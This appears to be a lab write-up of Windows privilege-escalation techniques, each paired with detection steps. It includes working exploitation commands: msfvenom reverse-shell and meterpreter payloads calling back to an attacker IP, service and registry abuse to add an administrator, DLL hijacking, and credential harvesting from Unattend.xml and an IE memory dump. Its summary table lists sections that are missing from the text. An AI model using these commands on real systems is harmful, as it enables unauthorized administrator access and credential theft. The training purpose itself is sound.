### 1️⃣ Autorun (Startup Programs)

**Detection:**
```cmd
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```
- Navigate to **Logon** tab.
- Notice "My Program" points to `C:\Program Files\Autorun Program\program.exe`.

**Check Permissions:**
```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
- Output shows "Everyone" has `FILE_ALL_ACCESS` on `program.exe`.

**Alternative Check:**
```cmd
icacls "C:\Program Files\Autorun Program"
```

**Exploitation:**
```bash
# Kali - Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe -o program.exe

# Start listener
rlwrap nc -lvnp 443

# Transfer to Windows, replace C:\Program Files\Autorun Program\program.exe
# Logoff and log back in as TCM/Hacker123
```

### 2️⃣ AlwaysInstallElevated

**Detection:**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
- Both show `AlwaysInstallElevated` = 1 (0x1)

**PowerUp Check:**
```powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

**Exploitation:**
```bash
# Kali - Generate MSI payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> -f msi -o setup.msi

# Transfer to Windows -> C:\Temp\
# Run:
msiexec /quiet /qn /i C:\Temp\setup.msi
```

---

### 3️⃣ Service Registry (regsvc)

**Detection:**
```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- Notice `NT AUTHORITY\INTERACTIVE` has `FullControl`.

**Exploitation:**
```bash
# Kali - Compile malicious service
# Edit windows_service.c, replace system() with:
cmd.exe /k net localgroup administrators user /add

# Compile
x86_64-w64-mingw32-gcc windows_service.c -o x.exe

# Transfer to Windows -> C:\Temp\
```

```cmd
# Windows - Change ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

# Start service
sc start regsvc

# Verify
net localgroup administrators
```

### 4️⃣ Executable Files (File Permissions Service)

**Detection:**
```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```
- "Everyone" has `FILE_ALL_ACCESS` on `filepermservice.exe`.

**Exploitation:**
```cmd
# Replace with malicious x.exe from previous step
copy /y C:\Temp\x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# Start service
sc start filepermsvc

# Verify
net localgroup administrators
```

### 5️⃣ Startup Applications

**Detection:**
```cmd
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
- `BUILTIN\Users` has full access `(F)`.

**Exploitation:**
```bash
# Kali - Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> -f exe -o x.exe

# Start listener in msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <KALI_IP>
run
```

```cmd
# Windows - Place x.exe in Startup folder
# C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\

# Logoff, login as TCM/Hacker123
# Meterpreter session should connect
getuid  # Should show User-PC\Admin
```

### 6️⃣ DLL Hijacking

**Detection:**
- Open `Procmon.exe` (Run as Administrator).
- Set filters:
  1. `Process Name` is `dllhijackservice.exe` then `Include`
  2. `Result` is `NAME NOT FOUND` then `Include`
- Start service: `sc start dllsvc`
- Notice it tries to load `C:\Temp\hijackme.dll` (writable location).

**Exploitation:**
```bash
# Kali - Edit windows_dll.c, replace system() with:
cmd.exe /k net localgroup administrators user /add

# Compile as DLL
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

# Transfer to Windows -> C:\Temp\
```

```cmd
# Windows - Stop/start service
sc stop dllsvc
sc start dllsvc

# Verify
net localgroup administrators
```

### 7️⃣ Binary Paths (Service Permissions – daclsvc)

**Detection:**
```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```
- User has `SERVICE_CHANGE_CONFIG` permission.

**Exploitation:**
```cmd
# Change binpath to add user
sc config daclsvc binpath= "net localgroup administrators user /add"

# Start service
sc start daclsvc

# Verify
net localgroup administrators
```

---

### 8️⃣ Unquoted Service Paths

**Detection:**
```cmd
sc qc unquotedsvc
```
- `BINARY_PATH_NAME` is unquoted with spaces.

**Exploitation:**
```bash
# Kali - Generate payload
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe

# Transfer to Windows
```

**Place in:**
```
C:\Program Files\Unquoted Path Service\Common.exe
```
(Windows will try: `C:\Program.exe`, `C:\Program Files\Unquoted.exe`, etc.)

```cmd
# Start service
sc start unquotedsvc

# Verify
net localgroup administrators
```

### 🔟 Password Mining – Unattend.xml

**Detection:**
```cmd
notepad C:\Windows\Panther\Unattend.xml
```
- Find `<Password>` section, copy Base64 string between `<Value>` tags.

**Decode:**
```bash
echo -n "cGFzc3dvcmQxMjM=" | base64 -d
```
**Answer:**
- Cleartext password → `password123`

### 1️⃣1️⃣ Credential Dumping (IE Memory)

**Exploitation – Basic Auth Capture:**
```bash
# Kali - Setup basic auth capture
msfconsole
use auxiliary/server/capture/http_basic
set uripath x
run
```

**Windows:**
- Browse to `http://<KALI_IP>/x`
- Open Task Manager, right-click `iexplore.exe` → Create Dump File
- Copy `.DMP` file to Kali.

```bash
# Kali - Extract credentials
strings iexplore.DMP | grep "Authorization: Basic"
echo -ne "<BASE64_STRING>" | base64 -d
```

## 🔑 Key Takeaways

| Technique | Detection | Exploitation |
|-----------|-----------|--------------|
| **Autorun** | Autoruns64.exe, accesschk | Replace .exe with reverse shell |
| **AlwaysInstallElevated** | `reg query` for Installer key | `msfvenom -f msi` + `msiexec` |
| **Service Registry** | `Get-Acl` on service key | Change `ImagePath` to malicious .exe |
| **Executable Files** | `accesschk` on service directory | Replace service .exe |
| **Startup Apps** | `icacls` on Startup folder | Drop reverse shell .exe in folder |
| **DLL Hijacking** | Procmon to find missing DLL | Compile malicious DLL, place in writable path |
| **Binary Paths** | `accesschk -wuvc` on service | `sc config` to change binpath |
| **Unquoted Paths** | `sc qc` to check | Drop .exe at first path segment |
| **Hot Potato** | N/A (use Tater) | `Invoke-Tater` NBNS spoofing |
| **Password Mining** | Check `Unattend.xml` | Decode Base64 string |
| **Credential Dumping** | Task Manager dump | `strings` + `grep` for Basic Auth |
| **Kernel Exploit** | `local_exploit_suggester` | MS16-014 (or similar) |
